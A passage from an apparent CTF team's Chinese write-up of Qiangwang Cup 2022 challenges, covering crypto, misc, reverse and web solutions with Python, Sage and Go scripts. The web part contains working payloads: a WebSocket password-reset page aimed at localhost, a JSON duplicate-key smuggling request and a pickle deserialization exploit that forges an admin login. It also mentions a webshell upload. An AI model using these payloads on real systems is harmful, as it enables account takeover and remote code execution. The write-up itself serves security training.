print('win')\n\n\ncheck()\n</code></pre> <p>\u4eff\u5c04\uff0c\u4f46\u662f\u7b80\u5355\u904d\u5386\u8f93\u5165\u5c31\u80fd\u5f97\u5230\u6b63\u786e\u7684flag\uff1a</p> <pre><code>c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12,\n     171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]\nfor i in c:\n    for a in range(32, 127):\n        if a * 33 % 179 == i:\n            print(chr(a), end=\"\")\n</code></pre>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/","title":"\u5f3a\u7f51\u676f2022-HED-WriteUp","text":"<p>Rank: 74 708pts 10Solved <code>HED \u662f\u5357\u65b9\u79d1\u6280\u5927\u5b66COMPASS\u5b9e\u9a8c\u5ba4\u7684CTF\u6218\u961f</code></p> <p>\u89e3\u9898\u60c5\u51b5\uff08\u5168\u90e810\u9898\uff09\uff1a</p> <ul> <li>\u5f3a\u7f51\u676f2022-HED-WirteUp</li> <li>MISC</li> <li>\u7b7e\u5230-Misc-8</li> <li>\u95ee\u5377\u8c03\u67e5-Misc-27</li> <li>\u8c0d\u5f71\u91cd\u91cd\uff08\u4e8c\u8840\uff09-Misc-271</li> <li>\u5f3a\u7f51\u5148\u950b</li> <li>rcefile-\u5f3a\u7f51\u5148\u950b-24</li> <li>ASR-\u5f3a\u7f51\u5148\u950b-68</li> <li>polydiv-\u5f3a\u7f51\u5148\u950b-48</li> <li>Web</li> <li>babyweb-Web-44</li> <li>crash-Web-76</li> <li>Reverse</li> <li>GameMaster-Reverse-80</li> <li>Crypto</li> <li>myJWT-Crypto-62</li> </ul>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#misc","title":"MISC","text":""},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#-misc-8","title":"\u7b7e\u5230-Misc-8","text":"<p>\u7b7e\u5230</p>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#-misc-27","title":"\u95ee\u5377\u8c03\u67e5-Misc-27","text":"<p>\u95ee\u5377</p>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#-misc-271","title":"\u8c0d\u5f71\u91cd\u91cd\uff08\u4e8c\u8840\uff09-Misc-271","text":"<p>\u9996\u5148\u770b <code>config.json</code> \u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u5f88\u50cf v2ray \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4e8e\u662f\u624b\u6413 VMess \u534f\u8bae\u3002\u8fd9\u90e8\u5206\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u5c31\u770b\u89c4\u8303\u548c\u4ee3\u7801\u76f4\u63a5\u5bf9\u7740\u5b9e\u73b0\u4e00\u904d\uff0c\u786e\u5b9e\u786c\u6838\u3002</p> <pre><code>import hmac\nimport hashlib\nfrom Crypto.Hash import SHAKE128\nfrom Crypto.Cipher import AES\n\nuuid = bytes.fromhex('b831381d63244d53ad4f8cda48b30811')  # \u53d6\u81ea config.json\n\ndef get_timestamp(f):\n    correct = f.read(16)\n    t0 = 1615528962  # \u53d6\u81ea pcap \u7684\u65f6\u95f4\n    for t in range(t0 - 60, t0 + 60):\n        h = hmac.new(uuid, int.to_bytes(t, 8, byteorder='big'), digestmod='MD5')\n        if h.digest() == correct:\n            return t\n\ndef decode_send_header(f, t):\n    key = hashlib.md5(uuid + b'c48619fe-8f02-49e0-b9e9-edf763e17e21').digest()\n    iv = hashlib.md5(int.to_bytes(t, 8, byteorder='big') * 4).digest()\n    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=AES.block_size*8)\n    header = cipher.decrypt(f.read(38))\n    iv = header[1:17]\n    key = header[17:33]\n    return iv, key\n\ndef decode_recv_data(f, iv, key):\n    iv = hashlib.md5(iv).digest()\n    key = hashlib.md5(key).digest()\n    shade = SHAKE128.new(data=iv)\n\n    f.seek(4)\n    data = b''\n    count = 0\n    while True:\n        padding = int.from_bytes(shade.read(2), byteorder='big') % 64\n        length = int.from_bytes(f.read(2), byteorder='big') ^ int.from_bytes(shade.read(2), byteorder='big')\n        if length - padding == 16:\n            break\n        chunk = f.read(length)\n        if padding &gt; 0:\n            chunk = chunk[:-padding]\n\n        chunk_iv = int.to_bytes(count, 2, byteorder='big') + iv[2:12]\n        cipher = AES.new(key, AES.MODE_GCM, chunk_iv)\n        chunk = cipher.decrypt_and_verify(chunk[:-16], chunk[-16:])\n        data += chunk\n        count += 1\n    return data\n\nif __name__ == '__main__':\n    with open('send.dat', 'rb') as f:\n        t = get_timestamp(f)\n        iv, key = decode_send_header(f, t)\n    with open('recv.dat', 'rb') as f:\n        data = decode_recv_data(f, iv, key)\n    with open('content.txt', 'wb') as f:\n        f.write(data)\n</code></pre> <p>\u7136\u540e\u53d1\u73b0\u662f\u4e00\u4e2a HTTP \u8bf7\u6c42\uff0c\u628a html \u91cc\u9762\u7684\u4e1c\u897f\u4fdd\u5b58\uff0c\u5f97\u5230\u4e86\u4e00\u4e2a <code>0208_54741869750132.doc</code>\u3002</p> <p>doc\u6587\u6863\u4e0b\u8f7d\u540e\u706b\u7ed2\u62a5\u6bd2\u4e0d\u65ad\uff0c\u5206\u79bb\u51fa\u7684dll\u6587\u4ef6\u770b\u8d77\u6765\u5e76\u4e0d\u7b80\u5355\uff0c\u8003\u8651\u5230\u5927\u6982\u7387\u8981\u63d0\u53d6\u5b8f\u75c5\u6bd2\u4e2d\u7684API\u5730\u5740\uff0c\u76f4\u63a5\u628a\u6587\u4ef6\u4e0a\u4f20\u5230\u5fae\u6b65\u4e91\u6c99\u7bb1\u5206\u6790\u884c\u4e3a\uff0c\u53d1\u73b0\u662f\u771f\u7684\u75c5\u6bd2\uff08https://s.threatbook.com/report/file/3a5648f7de99c4f87331c36983fc8adcd667743569a19c8dafdd5e8a33de154d\uff09</p> <p>\u540c\u65f6\u5728\u6837\u672c\u62a5\u544a\u91cc\u627e\u5230\u4e86api\u5730\u5740 <code>api.ipify.org</code> \uff08\u770b\u8d77\u6765\u5e76\u4e0d\u662f\u53ea\u6709\u6211\u4eec\u662f\u8fd9\u6837\u505a\u7684\uff0c\u5199wp\u65f6\u53d1\u73b07\u670831\u53c8\u88ab\u4e0a\u4f20\u4e86\u51e0\u6b21\uff09</p> <p>\u89e3\u538b\u540e\u62ff\u5230\u4e00\u4e2a\u81ea\u79f0\u662fGOB\u6587\u4ef6\u7684\u4e8c\u8fdb\u5236\uff0c\u6000\u7591\u662fgo\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\u6216\u8005\u662f\u6e38\u620f\u8d44\u6e90\u6587\u4ef6\uff0c\u628a\u6587\u4ef6\u59348\u5b57\u8282\u5341\u516d\u8fdb\u5236\u653e\u5230\u8c37\u6b4c\u91cc\u53ef\u4ee5\u641c\u5230\u4e00\u4e2agithub\u7684poc\u4ed3\u5e93\uff0c\u56e0\u6b64\u786e\u8ba4\u8be5\u6587\u4ef6\u662fgo\u7684\u6253\u5305\u6587\u4ef6\u3002  </p> <p>\u7528 pygob \u8bfb\u53d6\uff0c\u91cc\u9762\u6709\u65f6\u95f4\u6233 <code>2022-07-19 14:49:56</code> \u548c\u4e00\u4e2a\u6240\u8c13\u7684 PNG \u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u4e2a PNG \u6253\u4e0d\u5f00\u3002</p> <p>\u7136\u540e\u6839\u636e\u63d0\u793a\uff08~~\u552f\u4e00\u6709\u7528\u7684\u63d0\u793a~~\uff09\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6253\u4e71\u8fc7\u3002\u7136\u540e\u56e0\u4e3a\u6709\u65f6\u95f4\uff0c\u6240\u4ee5\u53ef\u4ee5\u8003\u8651\u7528\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u628a\u8fd9\u4e2a\u968f\u673a\u8fc7\u7a0b\u8fd8\u539f\u3002</p> <pre><code>func main() {\n    rand.Seed(1658213396)  // 2022-07-19 14:49:56\n\n    raw, err := os.ReadFile(\"p.png\")\n    len := len(raw)\n    mapping := make([]int, len)\n    data := make([]byte, len)\n\n    for i := 0; i &lt; len; i++ {\n        mapping[i] = i\n    }\n    rand.Shuffle(len, func(i, j int) {\n        mapping[i], mapping[j] = mapping[j], mapping[i]\n    })\n    for i := 0; i &lt; len; i++ {\n        data[mapping[i]] = raw[i]\n    }\n\n    f, err := os.Create(\"q.png\")\n    f.Write(data)\n}\n</code></pre> <p>\u7136\u540e\u8fd8\u539f\u4e4b\u540e\uff0c\u5c31\u5f97\u5230\u4e86\u4e00\u5f20\u6b63\u5e38\u7684 PNG \u56fe\u7247\u3002\u4e0d\u8fc7\u91cc\u9762\u4e5f\u4e0d\u76f4\u63a5\u662f flag\u3002\u7ecf\u8fc7\u89c2\u5bdf\uff0c\u56fe\u7247\u7684\u767d\u8272\u90e8\u5206\u548c\u84dd\u8272\u90e8\u5206\u90fd\u662f\u5168\u767d\u6216\u5168\u84dd\uff0c\u6ca1\u6709\u4fe1\u606f\u3002\u4e0d\u8fc7\u5b57\u7684\u8fb9\u7f18\u6709\u70b9\u610f\u601d\u3002\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u53d1\u73b0\u6392\u9664\u5168\u767d\u548c\u5168\u84dd\u50cf\u7d20\u4e4b\u540e\uff0c\u628a alpha \u7684\u6570\u636e\u76f4\u63a5\u63d0\u53d6\u62fc\u63a5\u4e4b\u540e\uff0c\u5c31\u662f flag \u4e86\u3002</p> <pre><code>from PIL import Image\nimg = Image.open('q.png')\nfor x in img.getdata():\n    if x != (255, 255, 255, 255) and x != (0, 0, 255, 255):\n        print(hex(x[3])[2:], end='')\n        # \u7136\u540e\u628a\u8f93\u51fa hex \u89e3\u7801\u4e00\u4e0b\u5373\u53ef\n</code></pre>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#_1","title":"\u5f3a\u7f51\u5148\u950b","text":"<p>\uff08\u63a8\u6d4b\u5f3a\u7f51\u5148\u950b\u662f\u96be\u5ea6\u8f83\u4f4e\u7684\u9898\u76ee\uff0c\u4f46\u662f\u5206\u7c7b\u672a\u77e5\uff09</p>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#rcefile-24","title":"rcefile-\u5f3a\u7f51\u5148\u950b-24","text":"<p>\u79c1\u6709\u73af\u5883\uff0c\u731c\u6d4b\u9700\u8981\u7b80\u5355\u626b\u63cf\uff0c\u5fa1\u5251\u5c1d\u8bd5100\u6761\u5e38\u89c1\u8def\u5f84\u53d1\u73b0www.zip\u6e90\u7801\u3002  </p> <p>\u4e0a\u4f20\u6587\u4ef6\u540e\u7f00\u8fc7\u6ee4\u5f88\u4e25\u683c\uff0c\u4e14\u6ca1\u4ec0\u4e48\u7ed5\u8fc7\u7684\u673a\u4f1a\uff0c\u524d\u8fb9\u4e5f\u88ab\u62fc\u63a5\u4e86md5\uff0c\u4e0d\u80fd\u4f20.htacess</p> <p>\u4e8e\u662f\u628a\u6240\u6709php\u5408\u6cd5\u6269\u5c55\u540d\u90fd\u8bd5\u4e00\u904d\uff08https://book.hacktricks.xyz/pentesting-web/file-upload\uff09 \uff0c\u53d1\u73b0phps\u6587\u4ef6\u4f1a403\uff0c\u7ee7\u7eed\u6d4b\u8bd5\u5269\u4f59\u6269\u5c55\u540d\u53d1\u73b0phar\u6587\u4ef6\u53ef\u4ee5\u89e3\u6790\u3002</p> <p>\u4f20\u9a6c\uff0c\u7ed3\u675f\u3002</p>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#asr-68","title":"ASR-\u5f3a\u7f51\u5148\u950b-68","text":"<p>factordb\u53ea\u80fd\u83b7\u5f97\u5f00\u65b9\u7684\u7ed3\u679c\u3002</p> <p>\u5206\u89e3\u56db\u4e2a128\u4f4d\u8d28\u6570\u7684\u4e58\u79ef\u5e94\u8be5\u5e76\u4e0d\u590d\u6742\uff0c\u653e\u5230yafu\u91cc\u5355\u7ebf\u7a0b\u8dd1\u4e0d\u5230\u4e00\u5c0f\u65f6\u5c31\u80fd\u51fa\u6765</p> <pre><code>SIQS elapsed time = 8.5662 seconds.\nTotal factoring time = 2415.3993 seconds\n\nP39 = 223213222467584072959434495118689164399\nP39 = 260594583349478633632570848336184053653\nP39 = 218566259296037866647273372633238739089\nP39 = 225933944608558304529179430753170813347\n</code></pre> <p>e\u548cphi\u4e0d\u4e92\u7d20\uff0c\u6570\u7406\u57fa\u7840\u532e\u4e4f\u7684\u6211\u4eec\u5e76\u6ca1\u6709\u7528<code>phi = (p-1)*(q-1)*(r-1)*(s-1)*p*q*r*s</code>\u68ad\u51fa\u7b54\u6848</p> <p>\u5728 https://www.modb.pro/db/404740 \u7684\u8ba8\u8bba\u4e2d\u627e\u5230\u80fd\u7528\u7684\u811a\u672c\uff0c\u6284\u8fc7\u6765\u6539\u5c11\u4e00\u4e2a\u56e0\u5b50</p> <p>sage\u90e8\u5206</p> <pre><code>n = p * q * r * s * p * q * r * s\ne = 3\nprint(n)\nphi = (p - 1) * (q - 1) * (r - 1) * (s - 1)\nR.&lt;x&gt; = Zmod(p)[]\nf = x ^ e - c\nf = f.monic()\nres1 = f.roots()\n\nR.&lt;x&gt; = Zmod(q)[]\nf = x ^e - c\nf = f.monic()\nres2 = f.roots()\n\nR.&lt;x&gt; = Zmod(r)[]\nf = x ^e - c\nf = f.monic()\nres3 = f.roots()\n\nR.&lt;x&gt; = Zmod(s)[]\nf = x ^e - c\nf = f.monic()\nres4 = f.roots()\n\nprint(res1,res2,res3,res4,sep='\\n')\n</code></pre> <p>python\u90e8\u5206</p> <pre><code>res1=[(61230132932186378005663689217798805559, 1)]\nres2=[(127287570627900634195349274487282947698, 1)]\nres3=[(159183122833201520722281740271702531008, 1), (54017009972585088360569997378772209006, 1), (5366126490251257564421634982763999075, 1)]\nres4=[(97828969479259149226856141068289169207, 1), (84132055525449472521332928867042183796, 1), (43972919603849682780990360817839460344, 1)]\n\ndef union(x1, x2):\n    a1, m1 = x1\n    a2, m2 = x2\n    d = gmpy2.gcd(m1, m2)\n    assert (a2 - a1) % d == 0\n    p1, p2 = m1 // d, m2 // d\n    _, l1, l2 = gmpy2.gcdext(p1, p2)\n    k = -((a1 - a2) // d) * l1\n    lcm = gmpy2.lcm(m1, m2)\n    ans = (a1 + k * m1) % lcm\n    return ans, lcm\n\n\ndef excrt(ai, mi):\n    tmp = zip(ai, mi)\n    return reduce(union, tmp)\n\n\nfor i in res1:\n    for j in res2:\n        for k in res3:\n            for l in res4:\n                ai = [i[0], j[0], k[0], l[0]]\n                # print(ai)\n                mi = [p, q, r, s]\n                flag = excrt(ai, mi)\n                flag = hex(flag[0])\n                try:\n                    print(bytes.fromhex(flag[2:]))\n                except:\n                    ...\n</code></pre>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#polydiv-48","title":"polydiv-\u5f3a\u7f51\u5148\u950b-48","text":"<p>\u7ed9\u51fa\u7b49\u5f0f $a(x) \\times b(x) + c(x) = r(x)$\uff0c\u5e76\u7ed9\u51fa\u591a\u9879\u5f0f $a(x), c(x), r(x)$\uff0c\u6c42 $b(x)$\u3002</p> <p>\u79fb\u4e00\u4e0b\u9879\uff0c\u5f97\u5230 $b(x) = \\big( r(x) - c(x) \\big) \\div a(x)$\uff0c\u524d\u9762\u51cf\u6cd5\u90e8\u5206\u5f88 trivial\uff0c\u540e\u9762\u9664\u6cd5\u7684\u90e8\u5206\uff0c\u56e0\u4e3a\u5df2\u77e5\u80fd\u6574\u9664\uff0c\u6240\u4ee5\u76f4\u63a5\u4e0a\u591a\u9879\u5f0f\u9664\u6cd5\u5373\u53ef\u3002</p> <pre><code>from pwn import *\nimport hashlib\nimport itertools\n\nconn = remote('IP', PORT)\n\ndef proof():\n    line = conn.recvline().decode().strip()\n    conn.recv()\n    hexdigest = line.split(' == ')[1]\n    suffix = line[12:28]\n    charset = string.ascii_letters + string.digits\n    for x in itertools.product(charset, repeat=4):\n        plain = ''.join(x) + suffix\n        if hashlib.sha256(plain.encode()).hexdigest() == hexdigest:\n            conn.sendline(''.join(x))\n\ndef decode_poly(line):\n    line = line.split(' = ')[1]\n    arr = None\n    for item in line.split(' + '):\n        p = 0 if item == '1' else (1 if item == 'x' else int(item[2:]))\n        if arr is None:\n            arr = [ 0 for _ in range(p + 1) ]\n        arr[p] = 1\n    return arr\n\ndef poly_add(x, y):\n    if len(x) &lt; len(y):\n        x, y = y, x\n    x = x[:]\n    for i in range(len(y)):\n        x[i] = (x[i] + y[i]) % 2\n    return x\n\ndef poly_div(x, y):  # x / y\n    x = x[:]\n    b = [ 0 for _ in range(len(x)) ]\n    low = min([ i for i, v in enumerate(y) if v == 1 ])\n    for i in range(len(x) - low):\n        c_pos = i + low\n        if x[c_pos] != 0:\n            b[i] = 1\n            for j in range(len(y)):\n                x[i + j] = (x[i + j] + y[j]) % 2\n    return b\n\ndef solve():\n    pr = decode_poly(conn.recvline().decode().strip())\n    pa = decode_poly(conn.recvline().decode().strip())\n    pc = decode_poly(conn.recvline().decode().strip())\n    conn.recvline()  # Please give me the b(x) which satisfy a(x)*b(x)+c(x)=r(x)\n    conn.recv()      # &gt; b(x) =\n\n    pb = poly_div(poly_add(pr, pc), pa)\n    terms = []\n    for i, v in list(enumerate(pb))[::-1]:\n        if v != 0:\n            terms.append('1' if i == 0 else ('x' if i == 1 else f'x^{i}'))\n    conn.send(' + '.join(terms))\n    print(conn.recvline())  # Success!\n\nif __name__ == '__main__':\n    proof()\n    for _ in range(40):\n        solve()\n    conn.interactive()\n</code></pre>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#web","title":"Web","text":""},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#babyweb-web-44","title":"babyweb-Web-44","text":"<p>\u8fd9\u4e2a bot \u7684\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u53ef\u4ee5\u7528 <code>bugreport http://host:port/login</code> \u8fd9\u6761\u6307\u4ee4\uff0c\u8ba9\u670d\u52a1\u5668\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u3002\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u5b83\u662f\u53ef\u4ee5\u8fd0\u884c JavaScript \u7684\u3002</p> <p>\u7136\u540e\u53d1\u73b0 <code>admin</code> \u5df2\u7ecf\u88ab\u6ce8\u518c\u4e86\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u5b83\u7684\u5bc6\u7801\uff0c\u7136\u540e\u5c1d\u8bd5\u767b\u5f55\u3002\u4ece\u9898\u9762\u7684 <code>docker</code> \u547d\u4ee4\u53ef\u4ee5\u77e5\u9053\u5b83\u5728\u672c\u5730\u7684\u7aef\u53e3\u662f <code>8888</code>\uff0c\u6240\u4ee5\u6784\u9020\u4e00\u4e2a html \u6587\u4ef6\uff0c\u6765\u5411 127.0.0.1 \u53d1\u9001\u4fee\u6539\u5bc6\u7801\u6307\u4ee4\uff1a</p> <pre><code>&lt;html&gt;&lt;body&gt;&lt;script&gt;\nws = new WebSocket('ws://127.0.0.1:8888/bot');\nws.onopen = function() {\n    ws.send('changepw 123456');\n}\n&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u7136\u540e\u4fee\u6539\u5b8c\u4e4b\u540e\u7528 <code>admin</code> \u548c <code>123456</code> \u767b\u5f55\uff0c\u5c31\u53ef\u4ee5\u5230\u4e00\u4e2a\u8d2d\u7269\u5c0f\u8f66\u7684\u540e\u53f0\u3002\u7136\u540e\u53d1\u73b0\u53ea\u6709 200$\uff0c\u4e70\u4e0d\u4e86 flag\u3002\u4e0d\u8fc7\u901a\u8fc7\u89c2\u5bdf\u6e90\u7801\uff0c\u53ef\u4ee5\u77e5\u9053\u8d2d\u4e70\u7684\u903b\u8f91\u5206\u5e03\u5728\u4e24\u4e2a\u4e0d\u540c\u7684\u540e\u7aef\u4e2d\uff0c\u5176\u4e2d\u4e00\u4e2a\u68c0\u67e5\u91d1\u94b1\u591f\u4e0d\u591f\uff0c\u53e6\u5916\u4e00\u4e2a\u5c06\u4e70\u5230\u7684\u4e1c\u897f\u52a0\u5165\u5230\u7528\u6237\u5c5e\u6027\u4e2d\u3002\u6240\u4ee5\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u8d70\u79c1\uff0c\u8ba9\u300c\u68c0\u67e5\u91d1\u94b1\u300d\u7684\u89c9\u5f97\u4e0d\u7528\u4e70\uff0c\u901a\u8fc7\u68c0\u67e5\uff0c\u8ba9\u300c\u4e70\u4e1c\u897f\u300d\u7684\u53ef\u4ee5\u6210\u529f\u4e70\u5230\u4e1c\u897f\u3002\u7ecf\u6d4b\u8bd5\uff0c\u4e0b\u9762\u7684 payload \u53ef\u4ee5\u6210\u529f\u8d70\u79c1\uff1a</p> <pre><code>{\n    \"product\":[{\"id\":1,\"num\":0},{\"id\":2,\"num\":0}],\n    \"product\":[{\"id\":1,\"num\":1},{\"id\":2,\"num\":1}]\n}\n</code></pre>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#crash-web-76","title":"crash-Web-76","text":"<p>\u89c2\u5bdf\u6e90\u7801\uff1a</p> <pre><code>@app.route('/balancer', methods=['GET', 'POST'])\ndef flag():\n    pickle_data=base64.b64decode(request.cookies.get(\"userdata\"))\n    if b'R' in pickle_data or b\"secret\" in pickle_data:\n        return \"You damm hacker!\"\n    userdata=pickle.loads(pickle_data)\n    if userdata.token!=hash(get_password(userdata.username)):\n         return \"Login First\"\n    if userdata.username=='admin':\n        return \"Welcome admin, here is your next challenge!\"\n    return \"You're not admin!\"\n</code></pre> <p>\u4e00\u773c\u770b\u4e0a\u53bb\u5c31\u662f pickle \u53cd\u5e8f\u5217\u5316\u5229\u7528\u3002\u4f46\u662f\u8fd9\u91cc\u7981\u7528\u4e86 <code>R</code> \u6307\u4ee4\uff0c\u4e0d\u8fc7\u95ee\u9898\u4e0d\u5927\uff0c\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u7528 <code>o</code> \u6765\u5e73\u66ff\u3002\u5373 <code>&lt;func&gt;(&lt;args&gt;tR</code> \u7b49\u4ef7\u4e8e <code>(&lt;func&gt;&lt;args&gt;o</code>\u3002\u628a pker.py \u811a\u672c\u7b80\u5355\u4fee\u6539\u4e00\u4e0b\u4e4b\u540e\u5c31\u80fd\u62ff\u6765\u7528\u4e86\u3002</p> <p>\uff08\u8fd9\u91cc\u961f\u5185\u7684M\u795e\u5df2\u7ecfRCE\u4e86\uff0c\u4f46\u662f\u53d1\u73b0\u6ca1\u6743\u9650\u8bfbnginx\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u73af\u5883\u4e5f\u662f\u5f88\u65b0\u7684\u597d\u50cf\u5e76\u6ca1\u6709\u4ec0\u4e48\u63d0\u6743\u7684\u673a\u4f1a\uff09</p> <p>\u7136\u540e\u4e0b\u4e00\u6b65\u5c31\u662f\u8ba9 <code>token != hash(...)</code> \u4e3a <code>False</code>\uff0c\u8fd9\u4e2a\u6211\u4e00\u5f00\u59cb\u5c1d\u8bd5\u4ece <code>app.get_password</code> \u548c <code>admin.secret</code> \u62ff\u5bc6\u7801\uff0c\u4f46\u662f\u62ff\u4e0d\u5230\u3002\u6240\u4ee5\u5c1d\u8bd5\u5c06 <code>token</code> \u53d8\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e\u628a\u8fd9\u4e2a\u5bf9\u8c61\u7684 <code>__ne__</code> hack \u4e3a\u6c38\u8fdc\u8fd4\u56de <code>False</code>\u3002</p> <p>\u4e0b\u4e3a payload\uff1a~~\u53d1\u73b0\u4e0d\u77e5\u9053\u4e3a\u5565\u4e0d\u9700\u8981\u7ed5 <code>secret</code>\uff0c\u4e0d\u8fc7\u8981\u7ed5\u8fc7\u4e5f\u5f88\u7b80\u5355\uff0c\u62ff <code>str.__add__</code> \u7ed5\u5373\u53ef~~</p> <pre><code>partial = GLOBAL('functools', 'partial')\ngetattr = GLOBAL('__builtin__', 'getattr')\nOrderedDict = GLOBAL('collections', 'OrderedDict')\nstartswith = getattr(GLOBAL('__builtin__', 'str'), 'startswith')\nUser = GLOBAL('app', 'User')\n\nfalse = partial(startswith, '1', '2')\nuser.__ne__ = false\nforever_ne = User('1', '2')\n\ndata = OrderedDict()\ndata.token = forever_ne\ndata.username = 'admin'\n\nreturn data\n</code></pre> <p>\u7136\u540e\u8fd9\u4e2a payload \u6254\u4e0a\u53bb\u4e4b\u540e\u5c31\u8fdb\u5230\u4e86\u4e00\u4e2a\u5747\u8861\u8d1f\u8f7d\u9875\u9762\u3002\u7ed3\u5408\u65f6\u4e8b\uff08\u6307\u67d0\u5783\u573e\u4e8c\u6b21\u5143\u89c6\u9891\u7f51\u7ad9\u7684\u4e8b\u6545\u5206\u6790\uff09\uff0c\u53d1\u73b0\u628a <code>weight</code> \u8bbe\u7f6e\u6210 0 \u53ef\u4ee5\u8ba9 <code>gcd</code> \u51fd\u6570\u6b7b\u5faa\u73af\uff0c\u6700\u7ec8 504 \u4ece\u800c\u62ff\u5230 flag\u3002</p>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#reverse","title":"Reverse","text":""},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#gamemaster-reverse-80","title":"GameMaster-Reverse-80","text":"<p>GitHub\u53ef\u4ee5\u6839\u636e\u8fd0\u884c\u65f6\u7684\u6807\u9898\u641c\u5230\u539f\u59cb\u7684\u4ed3\u5e93\uff0c\u5bf9\u7167dnspy\u7684\u7ed3\u679c\u7b80\u5355\u770b\u4e00\u4e0b\u662f\u591a\u4e86\u4e00\u4e2a\u5927\u7684\u540e\u95e8\u51fd\u6570\uff0c\u4ee5\u53cadll\u591a\u4e86\u4e00\u4e2agencode\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7528\u5230\u3002</p> <p>exe\u91cc\u7684\u540e\u95e8\u51fd\u6570\u6709\u4e09\u4e2acheckpoint\uff0c\u7b2c\u4e00\u6b65\u53d6\u51famessage\u6570\u636e\uff0c\u7b2c\u4e8c\u6b65xor 34\uff0c\u7b2c\u4e09\u6b65AES-ECB\u89e3\u5bc6\uff0c\u5bc6\u94a5<code>Brainstorming!!!</code></p> <p>\u89e3\u5bc6\u7684\u6587\u4ef6\u524d\u534a\u6bb5\u88ab\u8d5b\u535a\u53a8\u5b50\u8bc6\u522b\u4e3attf\u5b57\u4f53\uff0c\u4f46\u662f\u540e\u534a\u6bb5\u663e\u7136\u6709\u51fd\u6570\uff0c\u5bfc\u51fa\u7ed9binwalk\u770b\u4e00\u4e0b\u88ab\u544a\u77e5\u540e\u534a\u6bb5\u6709exe\uff0c\u4f46\u662f\u6ca1\u6709\u81ea\u52a8\u5206\u79bb\u51fa\u6765\uff0c\u624b\u52a8\u627e\u5230mz\u5934\u5206\u79bb\u51fa\u53d1\u73b0\u8fd8\u662f.net\u7a0b\u5e8f\uff0c\u7ee7\u7eed\u7ed9dnspy\u5206\u6790\uff0c\u5b9a\u4f4d\u5230\u6821\u9a8cflag\u7684\u51fd\u6570\uff0cx y z\u4e09\u4e2aULONG\u53d8\u91cf\u672a\u77e5\uff0c\u7ed3\u679c\u5df2\u77e5\uff0cflag\u5bc6\u6587\u5df2\u77e5\uff0c\u6c42\u5f97xyz\u5373\u53ef\u83b7\u5f97\u89e3\u5bc6\u5bc6\u94a5\u3002  </p> <p>\u7ed3\u679c\u768440\u4e2abyte\u7684\u6bcf\u4e00\u4f4d\u5bf9\u5e94\u4e00\u8f6e\u7684result\uff0c\u4e8e\u662f\u961f\u53cbM\u795e\u76f4\u63a5\u7ed9Z3\u4e22\u4e86320\u4e2a\u7ea6\u675f\u6761\u4ef6\uff0c10\u79d2\u5c31\u8dd1\u51fa\u6765\u4e86xyz\u3002</p> <p>(\u600e\u4e48klee\u8dd1\u4e8610\u5206\u949f\u90fd\u6ca1\u7ed3\u679c\u5462\u3002STP\u548cZ3\u5dee\u8ddd\u8fd9\u4e48\u5927\u5417)</p> <pre><code>import z3\n\ndef rotate():\n    global x, y, z\n    x = ((((x &gt;&gt; 29) ^ (x &gt;&gt; 28) ^ (x &gt;&gt; 25) ^ (x &gt;&gt; 23)) &amp; 1) | (x &lt;&lt; 1)) &amp; 0xFFFFFFFFF\n    y = ((((y &gt;&gt; 30) ^ (y &gt;&gt; 27)) &amp; 1) | (y &lt;&lt; 1)) &amp; 0xFFFFFFFFF\n    z = ((((z &gt;&gt; 31) ^ (z &gt;&gt; 30) ^ (z &gt;&gt; 29) ^ (z &gt;&gt; 28) ^ (z &gt;&gt; 26) ^ (z &gt;&gt; 24)) &amp; 1) | (z &lt;&lt; 1)) &amp; 0xFFFFFFFFF\n\ndef summary():\n    global x, y, z\n    return ((((z &gt;&gt; 32) &amp; 1) &amp; ((x &gt;&gt; 30) &amp; 1)) ^ ((((z &gt;&gt; 32) &amp; 1) ^ 1) &amp; ((y &gt;&gt; 31) &amp; 1))) &amp; 1\n\n\nx0, y0, z0 = z3.BitVecs('x y z', 33)\nx, y, z = x0, y0, z0\nbits = [0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 